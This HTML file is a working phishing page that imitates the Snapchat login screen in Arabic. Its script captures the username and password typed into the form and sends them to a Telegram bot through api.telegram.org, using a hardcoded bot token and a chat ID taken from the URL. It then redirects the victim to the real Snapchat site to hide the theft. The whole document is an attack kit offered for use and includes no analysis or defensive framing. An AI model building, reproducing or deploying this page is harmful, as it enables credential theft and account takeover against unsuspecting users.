<!DOCTYPE html>
<html lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Snapchat</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#fffc00;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;padding:20px;border-radius:20px;width:360px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,0.1)}
img{width:60px;margin-bottom:10px}h2{color:#000;margin-bottom:15px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:20px;font-size:16px;background:#f8f8f8}
.btn{background:#000;color:#fff;border:none;padding:12px;width:100%;border-radius:25px;font-size:18px;font-weight:bold;cursor:pointer}.btn:hover{background:#333}</style></head>
<body><div class="card">
<img src="https://www.snapchat.com/static/style-guide/images/ghost/ghost.svg" alt="Snapchat">
<h2>تسجيل الدخول إلى Snapchat</h2>
<input id="u" placeholder="اسم المستخدم أو البريد"><br>
<input id="p" type="password" placeholder="كلمة المرور"><br>
<button class="btn" onclick="sendData()">تسجيل الدخول</button>
</div>
<script>
const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";
const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');
function sendData(){const u=document.getElementById('u').value,pa=document.getElementById('p').value;
if(!u||!pa)return alert('املأ جميع الحقول');
fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('👻 Snapchat\n👤 '+u+'\n🔑 '+pa)}`)
.then(()=>{location.href='https://www.snapchat.com/'})}
</script></body></html>
